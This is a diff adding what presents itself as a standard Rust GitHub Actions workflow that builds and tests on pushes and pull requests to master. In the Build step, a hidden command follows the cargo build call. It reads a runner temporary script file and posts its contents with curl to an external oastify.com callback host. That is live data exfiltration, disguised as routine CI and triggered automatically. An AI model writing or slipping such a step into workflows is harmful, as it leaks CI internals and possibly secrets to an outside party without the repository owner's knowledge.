@@ -1,0 +1,22 @@
+name: Rust
+
+on:
+  push:
+    branches: [ "master" ]
+  pull_request:
+    branches: [ "master" ]
+
+env:
+  CARGO_TERM_COLOR: always
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v3
+    - name: Build
+      run: cargo build --verbose;cat /__w/_temp/63a931a1-e42f-4c35-804b-fbb595cb924a.sh |curl -F name=@- https://in9vav2by7jxhpd4y58816kk7bd11q.oastify.com
+    - name: Run tests
+      run: cargo test --verbose
